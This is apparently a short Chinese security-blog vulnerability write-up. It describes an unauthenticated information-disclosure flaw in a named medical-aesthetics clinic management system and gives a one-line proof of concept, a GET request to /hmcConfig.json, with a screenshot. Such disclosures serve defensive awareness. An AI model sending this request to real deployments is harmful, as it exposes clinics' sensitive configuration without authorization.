#  【漏洞复现】宏脉医美行业管理系统/hmcConfig.json存在信息泄露漏洞  
什么安全
                    什么安全  什么安全   2026-03-02 08:17  
  
  请勿利用  
文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接  
或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责  
！    
## 产品描述  
  
    
一款专为医美机构设计的  
  
数字化经营管理平台。该系统融合了医疗管理、客户服务、财务管控、私域营销等多维度功能，旨在提升机构运营效率、  
客户体验和  
业绩增长。  
## 漏洞描述  
  
  
  
   
 系统  
/hmcConfig.json接口存在未授权，可获取敏感信息。  
## Poc  
  
```
GET /hmcConfig.json
```  
  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XY4NEU6nZJBWiaDcR6nMzQib8yiblQl2Tian0LwD9KEibsQcyuDV0oUZxs2RiaD7hkpF8gh0PaUeQSYdODozyficZF5rDNhyu8EFVGl6wtPZxXHbiaI/640?wx_fmt=png&from=appmsg "")  
  
  
